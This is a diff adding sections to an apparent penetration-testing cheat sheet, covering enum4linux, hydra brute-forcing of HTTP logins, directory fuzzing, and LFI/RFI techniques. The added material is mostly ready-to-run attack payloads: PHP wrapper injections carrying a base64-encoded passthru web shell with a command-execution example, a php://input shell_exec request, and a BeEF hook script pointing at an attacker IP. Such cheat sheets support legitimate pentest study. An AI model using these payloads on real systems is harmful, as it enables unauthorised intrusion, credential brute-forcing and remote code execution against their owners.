@@ -14,8 +14,12 @@
 	```
 	nmap -T4 -A -p- IP
 	```
+4. enum4linux:
+	```
+	enum4linux -a IP
+	```
 
-## Port Enumeration:
+## Port Enumeration and Potential Exploits:
 
 ### 21 (FTP):
 1. Anonymous login is possible:
@@ -244,4 +248,110 @@
 	```
 	\# Execute payload
 	curl http://IP:8080/shell/
+	```
+7. **WebDav**
+	```
+	davtest -url URL
+	```
+8. HTTP Brute Force Authentication
+- _HTTP Basic Authentication_
+	```
+	\# Hydra
+	hydra -l USER -V -P /usr/share/wordlists/rockyou.txt -s 80 -f IP http-get /URL_ENDPOINT/ -t 15
+	```
+- _HTTP GET request_
+	```
+	hydra IP -V -l USER -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes;PHPSESSID=12345myphpsessid" -t 15
+	```
+- _HTTP POST request_
+	```
+	hydra -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
+	```
+9. Spider / Brute force directories / files
+	```
+	gospider -d DEPTHS --robots --sitemap -t 15 -s URL
+	```
+	```
+	ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u URL/FUZZ -e .php,.txt -t 15
+	```
+	```
+	Dictionaries :
+	/usr/share/wordlists/dirb/common.txt
+	/usr/share/wordlists/dirb/big.txt
+	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	```
+	_File backups_
+	```
+	file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
+	```
+10. Local File / Remote File Inclusion (LFI/RFI):
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+	```
+- Wrappers
+	```
+	\# php://filter
+	http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
+	\# expect://
+	http://example.com/index.php?page=expect://id
+	\# data://
+	echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=
+	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
+	If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
+	Code execution with 
+		- exec
+		- shell_exec
+		- system
+		- passthru
+		- popen
+	\# Example
+	echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
+	If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
+	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
+	\# input://
+	curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
+	```
+- Useful LFI lists
+	```
+	\Linux
+	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+	\Windows
+	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+	\# Both
+	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+	```
+- Tools
+	```
+	kadimus --url URL
+	python lfisuite.py
+	```
+11. Command Injection
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+	Burp!
+	```
+12. Deserialization
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
+	```
+13. File Upload
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+	```
+14. SQL Injection
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+	https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
+	```
+15. XSS
+	```
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+	beef-xss
+	cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
+	<script src="http://IP:3000/hook.js"></script>
+	```
+16. Upload a file with PUT
+	```
+	curl -X PUT http://IP/FILE -d @FILE  -v
 	```
